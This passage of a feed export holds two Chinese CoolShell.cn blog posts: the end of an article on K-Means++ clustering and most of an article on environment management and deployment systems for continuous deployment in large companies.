href=\"http://en.wikipedia.org/wiki/K-means%2B%2B\">K-Means++算法</a>可以用来解决这个问题，其可以有效地选择初始点）</li>\n</ul>\n<p>我在这里重点说一下 K-Means++算法步骤：</p>\n<ol>\n<li>先从我们的数据库随机挑个随机点当“种子点”。</li>\n<li>对于每个点，我们都计算其和最近的一个“种子点”的距离D(<var>x</var>)并保存在一个数组里，然后把这些距离加起来得到Sum(D(<var>x</var>))。</li>\n<li>然后，再取一个随机值，用权重的方式来取计算下一个“种子点”。这个算法的实现是，先取一个能落在Sum(D(<var>x</var>))中的随机值Random，然后用Random -= D(<var>x</var>)，直到其&lt;=0，此时的点就是下一个“种子点”。</li>\n<li>重复第（2）和第（3）步直到所有的K个种子点都被选出来。</li>\n<li>进行K-Means算法。</li>\n</ol>\n<p>相关的代码你可以在这里找到“<a href=\"http://rosettacode.org/wiki/K-means%2B%2B_clustering\">implement the K-means++ algorithm</a>”(墙) 另，<a href=\"http://commons.apache.org/math/api-2.1/index.html?org/apache/commons/math/stat/clustering/KMeansPlusPlusClusterer.html\" rel=\"nofollow\">Apache 的通用数据学库也实现了这一算法</a></p>\n<h4>K-Means 算法应用</h4>\n<p>看到这里，你会说，K-Means算法看来很简单，而且好像就是在玩坐标点，没什么真实用处。而且，这个算法缺陷很多，还不如人工呢。是的，前面的例子只是玩二维坐标点，的确没什么意思。但是你想一下下面的几个问题：</p>\n<p style=\"padding-left:30px\">1）如果不是二维的，是多维的，如5维的，那么，就只能用计算机来计算了。</p>\n<p style=\"padding-left:30px\">2）二维坐标点的X, Y 坐标，其实是一种向量，是一种数学抽象。现实世界中很多属性是可以抽象成向量的，比如，我们的年龄，我们的喜好，我们的商品，等等，能抽象成向量的目的就是可以让计算机知道某两个属性间的距离。如：我们认为，18岁的人离24岁的人的距离要比离12岁的距离要近，鞋子这个商品离衣服这个商品的距离要比电脑要近，等等。</p>\n<p><strong>只要能把现实世界的物体的属性抽象成向量，就可以用K-Means算法来归类了</strong>。</p>\n<p>在 《<a href=\"http://www.cnblogs.com/leoo2sk/archive/2010/09/20/k-means.html\">k均值聚类(K-means)</a>》 这篇文章中举了一个很不错的应用例子，作者用亚洲15支足球队的2005年到1010年的战绩做了一个向量表，然后用K-Means把球队归类，得出了下面的结果，呵呵。</p>\n<ul>\n<li>亚洲一流：日本，韩国，伊朗，沙特</li>\n<li>亚洲二流：乌兹别克斯坦，巴林，朝鲜</li>\n<li>亚洲三流：中国，伊拉克，卡塔尔，阿联酋，泰国，越南，阿曼，印尼</li>\n</ul>\n<p>其实，这样的业务例子还有很多，比如，分析一个公司的客户分类，这样可以对不同的客户使用不同的商业策略，或是电子商务中分析商品相似度，归类商品，从而可以使用一些不同的销售策略，等等。</p>\n<p>最后给一个挺好的算法的幻灯片：<a href=\"http://www.cs.cmu.edu/~guestrin/Class/10701-S07/Slides/clustering.pdf\">http://www.cs.cmu.edu/~guestrin/Class/10701-S07/Slides/clustering.pdf</a></p>\n<p>（全文完）<br>\n<hr height=\"1\" width=\"100%\">\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:11px;margin-bottom:50px\">————————============ <b>感谢 <a href=\"http://42qu.com/\">42qu.com</a> 为本站提供 <a href=\"http://vps.42qu.com/\"> VPS</a></b> ============————————</div>\n<table cellspacing=\"0\" cellpadding=\"3\" border=\"0\" style=\"clear:both\">\n    \n    <tr>\n        <td colspan=\"5\"><b><font size=\"-1\" style=\"display:block!important;padding:20px 0 5px!important\">您可能也喜欢：</font></b></td>\n    </tr>\n    \n        <tr>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important\">\n                    <a title=\"K Nearest Neighbor 算法\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8052.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7779.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.com/site_images/2012/08/17/42557429.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">K Nearest Neighbor 算法</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"JS1K 演示\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F2785.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7779.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/images/blogWidget/wordpress_default.gif\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">JS1K 演示</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"程序员的圣诞节\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F3429.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7779.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2011/05/10/1620086.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">程序员的圣诞节</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"为什么我反对纯算法面试题\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F8138.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7779.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2012/08/22/43747573.jpg\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">为什么我反对纯算法面试题</font>\n                    </a>\n                </td>\n                <td width=\"102\" valign=\"top\" style=\"padding:5px!important;margin:0!important;border-left:1px solid #dddddd!important\">\n                    <a title=\"Huffman 编码压缩算法\" style=\"text-decoration:none!important\" href=\"http://app.wumii.com/ext/redirect?url=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7459.html&amp;from=http%3A%2F%2Fcoolshell.cn%2Farticles%2F7779.html\">\n                        <img style=\"margin:0!important;padding:2px!important;border:1px solid #dddddd!important;width:96px!important;height:96px!important\" src=\"http://static.wumii.cn/site_images/2012/05/22/27329980.png\" width=\"96px\" height=\"96px\"><br>\n                        <font size=\"-1\" color=\"#333333\" style=\"display:block!important;line-height:15px!important;width:102px!important;font:12px/15px arial!important;height:60px!important;margin:3px 0 0 0!important;padding:0!important;overflow:hidden!important\">Huffman 编码压缩算法</font>\n                    </a>\n                </td>\n        </tr>\n    \n    <tr>\n        <td colspan=\"5\" align=\"right\">\n            <a style=\"text-decoration:none!important\" href=\"http://www.wumii.com/widget/relatedItems\" title=\"无觅相关文章插件\">\n                <font size=\"-1\" color=\"#bbbbbb\" style=\"display:block!important;font-family:arial!important;padding:5px 0!important;font-size:12px!important;color:#bbb!important\">无觅</font>\n            </a>\n        </td>\n    </tr>\n</table><h3>相关文章</h3><ul><li>2012年08月17日 -- <a href=\"http://coolshell.cn/articles/8052.html\" title=\"K Nearest Neighbor 算法\">K Nearest Neighbor 算法</a></li><li>2012年08月22日 -- <a href=\"http://coolshell.cn/articles/8138.html\" title=\"为什么我反对纯算法面试题\">为什么我反对纯算法面试题</a></li><li>2012年05月22日 -- <a href=\"http://coolshell.cn/articles/7459.html\" title=\"Huffman 编码压缩算法\">Huffman 编码压缩算法</a></li><li>2012年05月17日 -- <a href=\"http://coolshell.cn/articles/7425.html\" title=\"rsync 的核心算法\">rsync 的核心算法</a></li><li>2011年11月29日 -- <a href=\"http://coolshell.cn/articles/6010.html\" title=\"一些有意思的算法代码\">一些有意思的算法代码</a></li><li>2011年06月23日 -- <a href=\"http://coolshell.cn/articles/4883.html\" title=\"排序算法 Sleep Sort\">排序算法 Sleep Sort</a></li><li>2011年05月04日 -- <a href=\"http://coolshell.cn/articles/4671.html\" title=\"可视化的数据结构和算法\">可视化的数据结构和算法</a></li></ul></p>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1340635864436",
    "timestampUsec" : "1340635864436870",
    "id" : "tag:google.com,2005:reader/item/a7ad1459b145977d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "企业应用", "技术管理", "杂项资源", "流程方法", "agile", "CI", "部署" ],
    "title" : "持续部署，并不简单！",
    "published" : 1340583608,
    "updated" : 1340583608,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/7657.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p style=\"text-align:left\">【<strong>感谢 <a href=\"http://weibo.com/renfake\">@常新居士</a> 投递此文</strong> 】</p>\n<p style=\"text-align:left\">这几年，持续集成随着敏捷在国内的推广而持续走热，与之相伴的持续部署也一直备受关注。<strong>自前两年，持续交付这个延续性概念又闯进了国内IT圈，慢慢开始在社区和会议中展露头角。许多不明真相的群众跟风哭着喊着要“上”，而许多前CI的半吊子玩家换件衣服就接着干，有的甚至衣服都来不及换……</strong>。国内的这些土财主如果不巧请了某些所谓的战略家，除了建了一堆持续集成环境，以及每天嚷嚷着要这个要那个，混乱的状况在根本上没有得到改善。本文无意费力探讨持续集成和持续交付的概念，而是打算谈谈对于大型软件企业，以持续集成为基础实现持续部署（交付）时，所要面对的问题以及可行的解决方案。地主老财们，夜黑风正猛，山高路又远，注意脚下……</p>\n<p style=\"text-align:right\"><strong>And God Said, Let there be light: and there wa</strong>— GENSIS, Charpter 1, King James</p>\n<h4>一、起步</h4>\n<p>先来讲个故事……</p>\n<p>几年前，一对留美的夫妇通过朋友找到我，让我帮忙在国内组建一个开发团队，该团队负责为其开发一款基于社交网络的客户关系管理软件,（暂且称之为项目A）。这个项目除了尚不清晰的需求范围和很紧的期限外，作为业内人士的老公Richard根据眼下流行的软件开发过程还提了诸多额外的要求：</p>\n<ul>\n<li><strong>功能要及早交付</strong>（以便拿去和潜在的投资人洽谈）</li>\n<li><strong>功能在部署到生产环境前要先部署的一个测试环境</strong>（Richard要试用后给予反馈）</li>\n<li><strong>功能必须经过测试</strong>（长期作为软件外包的甲方，对质量要求严格）</li>\n<li><strong>要减少后期维护的工作</strong>（美国人精贵，少雇一个是一个）</li>\n<li><strong>支持协同开发</strong>（以便维护人员及早介入）</li>\n<li>……</li>\n</ul>\n<p><span style=\"color:#000000\"><strong>这正是持续集成所要解决的典型场景</strong></span>。针对Richard的要求，我们只要建立一个基于Hudson（现在叫Jenkins）+Maven +SVN 的持续集成环境（再加上持续集成所要求的测试和过程）就可以很好地满足上述要要求，此方案的结构如下：</p>\n<p><span></span></p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7686\" rel=\"attachment wp-att-7686\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/hudsonCI2.jpg\" alt=\"\" width=\"693\" height=\"719\"></a></p>\n<p>对于上述方案，让我们近距离看看各个服务器的内部情况，以及人员在这种方案下的分工协作：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7708\" rel=\"attachment wp-att-7708\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/response.jpg\" alt=\"\" width=\"658\" height=\"438\"></a></p>\n<p>我们先谈谈上面的图中涉及的一些概念性问题：</p>\n<h5><strong>1.1）编译时依赖</strong>和<strong>运行时依赖</strong></h5>\n<p>从字面上不难理解这两种依赖的类型。但要注意虽然编译时依赖常常也是运行时依赖，但并不能推断出一方必然是另一方。比如，在开发的过程中需要某些提供API的Jar包，而运行时可能是具体API实现的Jar包。再者，被依赖的包会有其自身的依赖，因此,项目对这些包产生间接依赖（<strong>运行时依赖</strong>），依此类推，最终形成一个<strong>依赖树</strong>。当项目运行时，这些依赖树上的包必须全部就位。</p>\n<p>Maven在POM中通scope来界定依赖的类型，从而帮助开发和运维人员摆脱手动处理依赖树的工作，然而运行时所依赖包最终是要安装到生产环境的，这部分工作Maven并不能自动完成。因此，一个常用方式是将运行时所依赖的包拷贝到项目文件中，比如Java Web应用的WEB-INF/lib，然后将项目总的打一个包。<strong>在安装项目包后，修改环境变量，将这些包所在的路径加入相应的环境变量中，如ClassPath</strong>。</p>\n<p>再看个例子，现代的操作系统和其它系统框架都考虑到了运行时依赖树的处理问题，比如Ubuntu的apt-get，CentOS的yum，Ruby的RubyGem，Node的npm等等。</p>\n<h5>1.2）依赖时的复杂度</h5>\n<p>项目除了对程序包的依赖，对于运行环境也有些具体的要求，比如，Web应用需要安装和配置Web服务器，应用服务器，数据服务器等，企业应用中可能需要消息队列，缓存，定时作业，或是对其它系统以Web Service方式暴露的服务。这些可以看做项目在系统层面对外部的依赖。这些依赖有些可以由项目自行处理，而有些则是项目无法处理的，比如运行容器，操作系统等，这些是项目的运行环境。</p>\n<p>总之，依赖的复杂度主要有两个：</p>\n<ol>\n<li>依赖包间的版本兼容性问题。兼容性问题是软件开发的恶梦</li>\n<li>间接依赖，或多重依赖问题。这个问题可以类比想像一下C++中的多重继续种出现的很多问题。</li>\n</ol>\n<div>比如：Ａ依赖于python 2.7，A还依赖于B，但是B却依赖于python 3，而Python 2.7和Python 3不兼容。这是依赖中最恶心的事。</div>\n<h5>1.3）任务分工</h5>\n<p>由于项目简单，因此并不需要专门的运维人员。以一个100人左右以交付为主业（恩，就是做外包）的公司为例，由于没有任何历史项目和代码的拖累，且各个项目间也没有任何关联，故而只需要配备一个IT支持人员进行资源方面的管理：分配机器，报修，初始化系统，分配IP地址等。各个项目的运行环境、数据库、开发环境等都由具体项目的开发人员手动完成。 环境出问题怎么办？很简单，凉拌——重装系统。实际的运行效果不错。</p>\n<h5>1.4）自动化部署</h5>\n<p>由于Hudson这样的持续集成环境提供了自动编译（定时或触发式）的功能，而且可以在编译过程中提供了一些扩展点，因此通过提供一个部署用的脚本，就可以非常容易实现简单的自动化部署。</p>\n<p>毫无疑问，持续集成就是敏捷的魔法药，它见效快、副作用小、业界的争论少。每每运用在混乱的项目中时，几周内项目就开始持续的产出经过测试的功能。对于独立项目，以持续集成为中心的持续部署绝对是不二选择。</p>\n<p><strong>但是，我们有没有想过，这会是一个自动化部署的通用解决方案吗？持续集成应该位于持续交付的中心吗？</strong></p>\n<h4>二、困境</h4>\n<p>回到我们的故事：项目A上线两年后，运营业绩不错，投资人第一轮注资后，Richard的公司进行了扩张，他们对项目进行了重构，而且随着用户数量的增长，公司分别在美国、英国和日本等地建立了运营中心，并且对亚洲市场进行的定制功能开发（项目A+），接下来，公司又投入开发了团购系统（项目B）。在获得了新一轮投资后，各条本来比较简单的业务和功能线上越来越复杂，需要不断地细分，于是公司再度扩张（开发人员达到了300人，国内200多人，而运维团队主要在美国），随后又为项目A/A+的高级用户开发了问答系统（项目C）。目前，他们正准备开发手机系统。 看看下面的图，公司增长的过程中，整个项目环境也变得复杂。（注意，这里是一种逻辑结构，而在物理层面项目B和项目A的生产环境可能部署在相同的机器上）。</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7694\" rel=\"attachment wp-att-7694\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/sampleT1-1024x529.jpg\" alt=\"\" width=\"717\" height=\"370\"></a></p>\n<p>同时，原本单一的项目软件结构随着业务系统的增加也不再简单： <img src=\"http://coolshell.cn/wp-content/uploads/2012/06/software.jpg\" alt=\"\" width=\"763\" height=\"414\"></p>\n<p>而软件间的版本依赖使这个问题变得更为复杂：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7700\" rel=\"attachment wp-att-7700\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/dependency.jpg\" alt=\"\" width=\"626\" height=\"343\"></a></p>\n<p>现在，Richard的公司已经不再是一条快乐的小鱼，而是渐渐成为一直庞大的巨兽。虽然只有四个产品，但公司却要支持几百台开发机，几十台生产服务器，还有对应的测试环境，数据库服务器，以及几十个开发小组，和一大堆的内部项目。我们尽可以使用持续集成来为我们完成自动化部署。但，<strong>当我们为各个项目建立起持续集成环境后，它能满足我们对于持续部署的要求吗？我们前期的工作可以简化我们今后项目的持续交付的工作的难度吗？它需要我们为之建立一个庞大的运维团队，还是可以让我们能节省下每一毛钱来投入到真正的业务价值中去？</strong></p>\n<p><strong>让我们先来看看复杂的项目环境中的几个场景</strong>：</p>\n<p><strong>场景1：环境升级</strong></p>\n<p style=\"padding-left:30px\">项目A和项目B都依赖于Web容器，公司决定升级Web容器版本，而公司要升级的机器有上百台，依赖人肉升级已不现实，维护团队因此针对各种软件开发了相应的自动化脚本，但当新的软件出现时，必须要开发新的脚本。而且当同时升级若干环境软件时，则难度随之增大，手工调度的方式极易出错，当升级失败时仍需要大量人工处理。由于存在大量升级脚本，有一定的维护成本。</p>\n<p><strong>场景2：依赖于环境的软件升级与回滚</strong></p>\n<p style=\"padding-left:30px\">针对环境升级，公司为项目A和项目B开发了新的版本。但环境的升级和软件的升级不是同步进行，出错的可能性非常大（想一想间接依赖和多重依赖的情况）。当新版本部署到生产系统时，发现问题，需要回滚到之前的版本——所有运行时版本都需要回滚，而且环境也需要同步回滚。几百台机器……</p>\n<p><strong>场景3：运行时依赖</strong></p>\n<p style=\"padding-left:30px\">在第一节的方案中，我们将所有的运行时依赖都打包到一起。当项目依赖关系复杂时，这样产生的包将非常臃肿，潜在地延长了部署的时间（想一想全世有几百台服务器，一个部署计划需要部署几百兆文件的情况），而且产生冲突的可能性非常大，而且对于不同类型的项目（Java和Ruby项目）缺乏通用性。06年左右，Nortel可是拿Excel统计过运行时依赖的，牵涉若干项目组，反复多次，没有个把月真搞不定。</p>\n<p><strong>场景4：泛滥的部署</strong></p>\n<p style=\"padding-left:30px\">每个项目相关的持续集成环境都需要开发自己的部署脚本，重复投入大，而且各个项目的部署过程不一致，并且对于同一个项目无法同时满足不同目的部署要求，例如，环境或系统配置参数改变后，无需安装包，只需做清理和激活的工作。最后，持续集成只是支持了和代码修改有关的部署。</p>\n<p><strong>场景5：不一致的环境</strong></p>\n<p style=\"padding-left:30px\">简单项目中，开发环境和运行环境都由开发人员搭建，当公司变大时，系统的运行环境将由运维人员搭建，而开发环境如果由运维人员搭建则工作量太大，由开发人员自己搭建则操作复杂又容易产生不一致的情况。</p>\n<p><strong>场景6：热切换</strong></p>\n<p style=\"padding-left:30px\">对于某些部署，需要尽量减少服务的停止时间，需要在服务的同时进行部署。</p>\n<p>这些场景只是以持续集成为中心的持续部署在面对大型企业时所遇到的部分问题。大型企业，人多，项目多，机器多，项目环境复杂，部署维护工作繁多。以持续集成为基础的部署可以解决各个项目的集成问题，却无法帮助企业应对复杂的项目环境和各种不同的部署要求。<strong>究其更本，大型企业中的部署不再是一个简单的问题，而是一个交付生态圈，基础设施和环境管理必须要纳入考虑之中。</strong>要实现真正意义上的持续部署，我们就必须<strong>把环境和项目同等对待</strong>，通通纳入管理之中。同时，部署本身要得到统一。<strong>一个好的部署机制，应该是易于建立，易于使用，易于维护。</strong></p>\n<h4>三、任脉——环境管理</h4>\n<p>什么是环境？</p>\n<p>系统运行所依赖和包含的一切就是其环境：硬件、操作系统，网络资源（IP地址、域名），服务容器，服务器软件配置，环境亦是，运行时依赖的命令和包，项目本身的包和配置都是环境的一部分。对于部署而言，广义上，这些通通应该纳入环境管理的范畴，但狭义上，从软件系统的角度看，一个环境就是其运行需要的软件及其配置（我们先把操作系统和网络资源当做基础设施，其在部署时已处于就位的情况）。因此：</p>\n<p><strong>项目A的生产环境 = 项目A本身的软件包 + 项目A运行时依赖的软件包 + 项目A运行时依赖的其它软件 + 项目A的配置信息</strong></p>\n<p>由于，项目本身的软件包、项目运行时依赖的软件包，以及项目运行时依赖的其它软件在本质上没有区别——都是软件，上面的定义可以进一步抽象为：</p>\n<p><strong>环境 = 软件包 + 配置信息</strong></p>\n<p>在这个定义下，我们就必须将运行环境的软件解构，并以包的形式导入到公司的整个项目资源库中，比如Apache将作为一个包被导入，而Apache依赖的其它包也将依次被导入，并建立起正确的依赖关系。而且，在导入的过程中还必须做些相应的调整，如，环境变量的读取和设置，必须来自于环境配置模块，而不要修改系统的环境变量，防止不同环境在系统环境配置上相互影响和依赖。</p>\n<p>再回头审视我们的示例，项目A的生产环境可以部署在不同的区域，对于各个区域可能有定制化的设定。这就像面向对象中的类，可以通过继承使子类重用父类的公有属性和行为并添加自己特有的信息。因此，环境的概念模型如图：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7725\" rel=\"attachment wp-att-7725\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/Env.jpg\" alt=\"\" width=\"523\" height=\"118\"></a></p>\n<p>通过这样的关系，我们很容易为示例的复杂环境建立一种简单的结构，对于项目A：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7729\" rel=\"attachment wp-att-7729\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/org1.jpg\" alt=\"\" width=\"599\" height=\"519\"></a></p>\n<p>这里，环境依然是处于知识层面（Knowledge Level），它并未与具体的基础设施相关联。当我们将一个环境“具现化”成一个运行系统时，我们就产生了一个真正的环境实例。在这两者之间，我们还必须要考虑环境实例的使用目的（开发？测试？……）以及安装所依赖的其它信息（如机器），因此，我们需要增加一个环境目标来集中这些信息，而且由于不同目标的环境可能会有所差别，因此，环境目标也需要配置的能力。概念模型如图：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7731\" rel=\"attachment wp-att-7731\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/target.jpg\" alt=\"\" width=\"523\" height=\"438\"></a></p>\n<p>图中的环境实例是如何产生的呢？<strong>部署</strong>，<strong>一次部署可能会产生一个环境实例。</strong>一系列部署将产生对应于环境目标的多个环境实例，除去当前起作用的环境实例外（最新的），其它的是历史环境实例。<strong>通过在历史环境实例中切换，我们自然而然的就可以使整个环境回滚，因为项目所依赖的一切都已经成为的环境中的软件包，而且环境依赖的包的版本会随着部署具体确定下来。</strong>如此一来，我们便可以给每个环境实例分配一个版本号，再通过环境实例的版本号与软件包的版本对应起来，从而得知一次部署时应用的具体软件包，如图：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7732\" rel=\"attachment wp-att-7732\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/version.jpg\" alt=\"\" width=\"669\" height=\"394\"></a></p>\n<p>目前的环境管理结构，已经可以解决场景1、2和5的问题。那<strong>么对于场景2，运行时依赖，环境管理应该如何解决呢？</strong></p>\n<p>细心的朋友，可能已经发现，<strong>在环境层面上我们确定了环境依赖的软件包</strong>，这里有两个隐藏的含义：</p>\n<ul>\n<li>环境定义的是对软件包的运行时依赖</li>\n<li>由于环境是一个逻辑上的概念，因此其所用的软件包也是一个逻辑上的概念（相对于版本控制系统中的软件包）</li>\n</ul>\n<p>我们也已经知道，在部署时，一个环境实例将具体的确定其依赖的软件包的版本。某个版本的软件包最终与代码库中的物理的软件包相关联。但软件包是运行时的安装包，因此，它应该是代码库中包编译的结果。在对代码库的包编译时，既要将结果打上版本保存起来，也好在两者的版本间建立关系，最后，编译结果应该是某种既定的安装包目录文件结构。</p>\n<p>另外，当环境包含的包比较多时，运行时版本树会非常大，手动的指定全部的包的版本将是一个非常大的体力劳动，这部分工作也要得到简化。由此，我们必须</p>\n<div>\n<ul>\n<li><strong>建立逻辑软件包版本和版本库中软件包版本间的关系</strong></li>\n<li><strong><strong>为相互依赖的包编译并打上统一的标签</strong></strong></li>\n<li><strong>简化运行时包依赖关系的生产</strong></li>\n<li><strong>简化运行时包依赖的指定（可参考apt-get和RubyGem，环境只需指定直接依赖的包，间接依赖的包从运行时依赖树中自动导入）</strong></li>\n</ul>\n<div>一个可能的简单结构如下：</div>\n<p><a href=\"http://coolshell.cn/?attachment_id=7736\" rel=\"attachment wp-att-7736\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/pkg1.jpg\" alt=\"\" width=\"783\" height=\"195\"></a></p>\n<p>上述讨论还没有涉及操作系统，<strong>如果我们的运行机器要支持多个系统，我们又该怎么办？？？</strong></p>\n<p>配置信息也是个大问题，大家可以思考</p>\n<ul>\n<li><strong>环境配置和应用配置如何区分？</strong></li>\n<li><strong>如何简化环境配置工作？</strong></li>\n<li><strong>如何使环境配置的效果只对具体环境有效，而不会泄露到环境外部？</strong></li>\n</ul>\n</div>\n<p>再者，</p>\n<ul>\n<li><strong>如何使应用支持多运行目标？</strong></li>\n<li><strong>环境管理如何能方便开发环境的调试？</strong></li>\n<li><strong>要如何简化版本的选择?</strong></li>\n<li><strong><strong>在多个包有编译和运行时依赖时，编译时如何检查以减少引入兼容性问题的风险？</strong></strong></li>\n</ul>\n<p>这些都留待大家思考。</p>\n<h4>四、督脉——部署系统</h4>\n<p>《持续集成》和《持续交付》中都对部署有详细的讨论，不在赘述。<strong>在我看来，部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中</strong>。我们一会再回国头来看这段文绉绉的话，先看看第一部分持续集成的环境下，我们部署的步骤可能会是下面这个样子：</p>\n<ol>\n<li>登陆目标机（ssh）</li>\n<li>停止服务</li>\n<li>清理环境</li>\n<li>准备安装环境（创建文件夹等）</li>\n<li>安装项目包（rsync，解压，权限设置等）</li>\n<li>配置环境变量</li>\n<li>启动服务</li>\n<li>……</li>\n</ol>\n<p>而在第二部分的<strong>情景4</strong>中，我们看到如果对不同的持续集成环境建立不同的部署脚本和环境维护脚本，这部署过程的维护会非常繁琐。基于第三部分的环境管理，我们可以将部署过程抽象为：</p>\n<p><a href=\"http://coolshell.cn/?attachment_id=7737\" rel=\"attachment wp-att-7737\"><img src=\"http://coolshell.cn/wp-content/uploads/2012/06/deploy.jpg\" alt=\"\" width=\"566\" height=\"351\"></a></p>\n<p>现在回到开头那个文绉绉的描述：<strong>部署其就是按照其目的执行一系列步骤将环境置于其目的所指向的状态中</strong>。</p>\n<p>由于我们已经将部署作为环境管理的一部分，而环境又是对外提供服务的最小实体，因此，对环境的部署就是要根据部署的类型，在环境上按一定的步骤执行一系列操作，从而使环境置于部署类型所要的状态，这个过程中可能会生成对应的环境实例。举例来说，我们可能会修改环境相关的一些配置，然后重启环境，显然，这种情况下不需要下载安装软件包（没有改变），因此也就不需要生成环境实例。</p>\n<p>对于标准的部署——安装软件包并启动环境，可能的步骤将会是：</p>\n<ol>\n<li>选择将要部署的软件包的版本</li>\n<li>生成新的环境实例（确定环境实例的版本和其依赖包的版本，确定环境配置等）</li>\n<li>清理和准备目标机环境</li>\n<li>下载包</li>\n<li>设置环境配置</li>\n<li>环境实例切换</li>\n<li>生成部署报告</li>\n<li>……</li>\n</ol>\n<p>好，部署系统和环境管理各就各位，我们可以将各个项目环境纳入我们的环境管理之中，甚至是持续集成环境本身。再补充一句，要让部署系统和环境管理能很好的发挥作用，我们即需要一个简单一致的UI界面（为开发人员），也需要提供一个清晰明了的服务接口（供外部系统调用，如持续部署系统）。<strong>对于与环境管理相关的机器状态管理，网络资源的配置等等，本文不再涉及，大家可以自己思考</strong>。环境管理的实现、编译系统改造以及持续部署的具体实现，另作文章探讨。</p>\n<p>就技术而言（不考虑围绕持续部署的过程实践），环境管理、部署系统以及我们没有提及的编译系统改造才是生产线的真正引擎，持续部署不过是水到渠成的传送带而已。</p>\n<h4>五、没完</h4>\n<p>打通了任督二脉后，事还还没有完，还有很多细节上的问题。你想，这个工具实在是太好用了，于是公司里成百上千的工程师们都在使用这个自动化部署系统，我们又会面对很多很多问题：</p>\n<ul>\n<li><strong>部署系统的性能问题</strong>。几百号人不停地在把他们的软件部署到自己的机器上，部署到测试环境，部署到生产环境，一天之内一个人可能会要部署N次，回滚N次，不但有大量部署请求，还有大量的文件在网络上传输。你得想想这套部署系统如何解决这些性能问题，还得考虑未来更大规模的性能水平扩展问题。</li>\n</ul>\n<ul>\n<li><strong>目标机环境的管理。</strong>在目标运行机上需要解决几个问题：1）两个环境间如果有一些的一样的包，那就没有必要再下载了，这样可以节约时间。2）每次部署都需要把老的部署环境给保留下来，这样方便在新旧环境下的切换。这两点对于在生产环境下部署非常关键。（这需要环境内所有软件的绿色安装才能更容易达到这个目标，因些，Unix/Linux会比Windows更容易做到这点）</li>\n</ul>\n<ul>\n<li><strong>部署一致性事务问题</strong>。有时候，我们需要同时部署若干台服务器，比如：包A到机器MA，包B到机器MB，